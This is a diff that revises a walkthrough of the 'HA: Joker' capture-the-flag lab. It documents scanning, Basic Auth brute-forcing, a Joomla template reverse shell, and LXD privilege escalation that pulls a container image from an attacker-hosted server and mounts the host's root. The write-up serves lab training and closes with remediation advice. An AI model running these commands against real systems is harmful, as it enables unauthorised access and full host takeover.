@@ -1,96 +1,79 @@
 # HA: Joker — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.101 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.101 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | final.txt in /mnt/root/root |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/ha-joker,379/) |
+| **Goal** | Read /root/final.txt |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/ha-joker-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → dirb secret.txt → port 8080 HTTP Basic brute (Base64 decode: joker:hannah) → Joomla /administrator → PHP reverse shell → LXD group abuse → root
+Credential brute-force on HTTP Basic Auth exposed a Joomla site, default admin creds gave template RCE, and LXD group membership allowed mounting the host filesystem as root.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Enumerate port 80 for hidden files
-3. Brute-force HTTP Basic Auth on port 8080
-4. Log in to Joomla admin and inject PHP reverse shell
-5. Escalate via LXD group (Alpine container mounts host /)
+1. Recon — nmap full-port scan, discover services on 22/80/8080
+2. Enumeration — dirb with `.txt` extension reveals `secret.txt`; Burp Intruder brute-forces HTTP Basic Auth
+3. Exploitation — Joomla template editor PHP reverse shell
+4. Privilege Escalation — LXD container with `security.privileged=true` mounts host root
 
----
-
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+nmap -sV -sC -p- 192.168.1.101
 ```
 
-Then scan all ports and services:
+Key open ports:
 
-```bash
-nmap -A 192.168.1.101
-```
+| Port | Service |
+|---|---|
+| 22/tcp | SSH (OpenSSH) |
+| 80/tcp | HTTP (Joker quotes page) |
+| 8080/tcp | HTTP (login-protected panel) |
 
-Open ports: **22** (SSH), **80** (HTTP), **8080** (HTTP — login-protected panel).
+Port 80 returns a page of Joker quotes. Checking the HTML source reveals additional quotes in comments but no credentials. Port 8080 requires HTTP Basic Authentication.
 
-![Nmap scan](images/01-nmap.png)
+![Nmap scan results](images/01-nmap.png)
 
----
+## Step 2: Enumeration
 
-## Step 2: Enumerate Port 80 — Find secret.txt
+Run dirb against port 80 searching for `.txt` files:
 
 ```bash
 dirb http://192.168.1.101/ -X .txt
 ```
 
-Found: `http://192.168.1.101/secret.txt`
+This uncovers `/secret.txt`. The file contains a Batman/Joker exchange referencing "rock" (pointing to `rockyou.txt`) and the number "100" (suggesting the top 100 entries). The username `joker` is also implied.
+
+Extract the top 100 entries from rockyou:
 
 ```bash
-wget http://192.168.1.101/secret.txt
-cat secret.txt
+head -100 /usr/share/wordlists/rockyou.txt > top100.txt
 ```
 
-The file contains a username hint pointing to `joker` and a note about port 8080.
-
-Build a quick wordlist from rockyou for brute force:
+Use Burp Suite Intruder in Sniper mode against the `Authorization` header (Base64-encoded `joker:<password>`). Generate payloads by Base64-encoding each candidate with the username prefix:
 
 ```bash
-head -n 100 rockyou.txt > dict.txt
+while read p; do echo -n "joker:$p" | base64; done < top100.txt > payloads.txt
 ```
 
-![dirb and secret.txt](images/02-dirb-secret.png)
+A 200 response reveals the credentials: `joker:hannah`.
 
----
+![Enumeration and secret.txt discovery](images/02-enum.png)
 
-## Step 3: Brute-force HTTP Basic Auth (Port 8080)
+## Step 3: Exploitation — Joomla Template PHP Shell
 
-Using Burp Suite Intruder (Sniper mode) against the Authorization header, or with Hydra:
+Browse to `http://192.168.1.101:8080` and authenticate with `joker:hannah`. This reveals a Joomla site. Navigate to the Joomla administrator panel:
 
-```bash
-hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 192.168.1.101 http-get /
+```
+http://192.168.1.101:8080/administrator
 ```
 
-Credentials recovered: **joker:hannah**
+Login with the default credentials `joomla:joomla` (Joomla superuser default).
 
-Verify by decoding the Base64 Authorization header from the successful 200 response:
-
-```bash
-echo "am9rZXI6aGFubmFo" | base64 -d
-# joker:hannah
-```
-
-![Burp brute-force](images/03-burp-brute.png)
-
----
-
-## Step 4: Joomla Admin — PHP Reverse Shell
-
-Log in to port 8080 as `joker:hannah`. Navigate to `/administrator` and log in with default credentials **joomla:joomla**.
-
-Go to **Extensions → Templates → beez3 → Customise → index.php**, replace the contents with a PHP reverse shell (edit IP and port to attacker values), and save.
+Navigate to **Extensions > Templates > Templates > beez3 > index.php** and replace the template's `index.php` content with a PHP reverse shell (e.g., PentestMonkey's php-reverse-shell, edited to point to your LHOST and LPORT).
 
 Start the listener:
 
@@ -98,74 +81,88 @@ Start the listener:
 nc -lvnp 4444
 ```
 
-Trigger the shell by loading the Joomla front page. Stabilise:
+Trigger the shell by visiting:
+
+```
+http://192.168.1.101:8080/templates/beez3/index.php
+```
+
+Upgrade to a PTY:
 
 ```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 Check group membership:
 
 ```bash
 id
-# uid=33(www-data) gid=33(www-data) groups=33(www-data),108(lxd)
+# uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
 ```
 
-User is in the **lxd** group — privilege escalation vector confirmed.
+The `www-data` user is in the `lxd` group, which is the privilege escalation path.
 
-![Joomla shell](images/04-joomla-shell.png)
+![PHP reverse shell through Joomla template editor](images/03-exploit.png)
 
----
+## Step 4: Privilege Escalation — LXD Group Abuse
 
-## Step 5: LXD Group Abuse → Root
-
-On the attacker machine:
+On the attacker machine, build an Alpine Linux LXD image:
 
 ```bash
 git clone https://github.com/saghul/lxd-alpine-builder.git
 cd lxd-alpine-builder
 ./build-alpine
+```
+
+Serve the resulting `.tar.gz` over HTTP:
+
+```bash
 python3 -m http.server 8000
 ```
 
-On the target (www-data shell):
+On the target (reverse shell), download and import the image:
 
 ```bash
-wget http://<ATTACKER_IP>:8000/alpine-v3.10-x86_64-20191019_0712.tar.gz
-lxc image import ./alpine-v3.10-x86_64-20191019_0712.tar.gz --alias myimage
+cd /tmp
+wget http://<LHOST>:8000/alpine-v3.x-x86_64-<date>.tar.gz
+lxc image import alpine-v3.x-x86_64-<date>.tar.gz --alias myimage
 lxc image list
+```
+
+Create a privileged container with the host root filesystem mounted:
+
+```bash
 lxc init myimage ignite -c security.privileged=true
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 lxc start ignite
 lxc exec ignite /bin/sh
 ```
 
-Inside the container, the host filesystem is at `/mnt/root`:
+You now have a root shell inside the container with the host filesystem at `/mnt/root`.
+
+![LXD privilege escalation setup](images/04-privesc.png)
+
+## Step 5: Root Flag
 
 ```bash
-id
-# uid=0(root) gid=0(root)
-cd /mnt/root/root
-ls
-cat final.txt
+cat /mnt/root/root/final.txt
 ```
 
-![Root access via LXD](images/05-root.png)
-
----
+![Root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **HTTP Basic Auth** is trivially brute-forced — never use it without rate limiting or account lockout
-2. **Default CMS credentials** (joomla:joomla) persist in many deployments; always change them post-install
-3. **LXD group membership** grants effective root — treat it as equivalent to root access
-4. **PHP template editor** in any CMS (Joomla, WordPress) is a direct RCE vector if admin credentials are compromised
+1. HTTP Basic Auth brute-forcing is straightforward when a username hint exists in publicly accessible files.
+2. Default CMS credentials (`joomla:joomla`) are frequently left unchanged on demo or CTF boxes; always test them.
+3. Membership in the `lxd` group is equivalent to root access: any user in this group can spawn a privileged container and access the entire host filesystem.
+4. CMS template editors that allow arbitrary PHP execution are a critical attack surface.
 
 ## Remediation
 
-| Vulnerability | Fix |
-|---------------|-----|
-| HTTP Basic Auth brute-forceable | Add rate limiting; switch to form-based auth with lockout |
-| Default Joomla credentials | Change admin password immediately after installation |
-| www-data in lxd group | Remove from group; restrict LXD to trusted admin users only |
-| PHP template editing enabled | Disable in CMS settings or restrict to admins via file permissions |
+| Vulnerability | Recommended Fix |
+|---|---|
+| HTTP Basic Auth brute-forceable | Implement account lockout and strong unique passwords; use a WAF or rate limiter |
+| Default CMS admin credentials | Change all default passwords immediately after installation |
+| PHP execution via template editor | Restrict template editing to trusted admins; disable PHP execution in web directories via `disable_functions` |
+| `www-data` in `lxd` group | Remove web-server users from the `lxd` group; restrict LXD access to dedicated admin accounts |
+| LXD privileged containers | Enforce `security.privileged=false` by policy; use AppArmor profiles |
